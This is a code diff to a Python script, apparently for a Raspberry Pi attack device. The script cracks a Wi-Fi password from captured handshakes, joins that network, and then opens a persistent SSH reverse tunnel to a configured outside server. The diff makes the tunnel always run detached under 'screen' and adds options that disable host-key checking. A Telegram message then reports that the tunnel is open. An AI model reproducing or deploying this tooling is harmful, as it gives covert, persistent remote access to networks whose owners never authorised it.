@@ -73,7 +73,7 @@ def pcap_to_hashcat_format(file_name: str):
         sys.exit(1)
         
         
-def open_reverse_tunnel(persistent = False):
+def open_reverse_tunnel():
     """Open a reverse tunnel from the raspberry to the configured server. The configured server information must be specified in 'configuration.json' file with the 
     key 'reverse_ssh_tunnel'. The following fields are mandatory:
         - user: indicates the remote user
@@ -81,11 +81,8 @@ def open_reverse_tunnel(persistent = False):
         - key_path: this field is very important to establish the connection. You have to specify the path where the private key (previosly generated and 
         configured in remote host) to connect to the remote host is placed.
 
-    Args:
-        persistent (bool, optional): If it is True, creates a reverse tunnel with 'screen' command to make it persistent. Defaults to False.
-
     Returns:
-        If persistent is True, does not return nothing. Otherwise, return the process created with 'subprocess.Popen' to close the tunnel when necessary.
+        Return the process created with 'subprocess.Popen' to close the tunnel when necessary.
     """
     
     reverse_tunnel_information: dict = get_config_field('reverse_ssh_tunnel')
@@ -101,14 +98,10 @@ def open_reverse_tunnel(persistent = False):
     if reverse_tunnel_information.get('port'):
         remote_port = reverse_tunnel_information.get('port')
 
-    if persistent:
-        command = f'screen -dmS reverse_ssh_tunnel ssh -i {key_path} -R {remote_port}:localhost:22 {remote_user}@{remote_host} -N'
-        subprocess.run(command, shell=True, text=True)
-        return None
-    else:
-        command = ["ssh", "-i", key_path, "-R", f"{remote_port}:localhost:22", f"{remote_user}@{remote_host}", "-N"]
-        process = subprocess.Popen(command, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-        return process
+    command = ['screen', '-dmS', 'reverse_ssh_tunnel', 'ssh', '-i', key_path, '-o', 'StrictHostKeyChecking=no', '-o', 'UserKnownHostsFile=/dev/null', 
+                '-R', f'{remote_port}:localhost:22', f'{remote_user}@{remote_host}', '-N']
+    process = subprocess.Popen(command, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+    return process
 
 
 def kill_process(process):
@@ -338,5 +331,5 @@ if __name__ == '__main__':
     connect_to_network(network_ssid, cracked_password)
     
     # Open persistent reverse tunnel
-    open_reverse_tunnel(persistent=True)
+    open_reverse_tunnel()
     telegram_message(telegram_bot, 'Tunel persistente abierto')
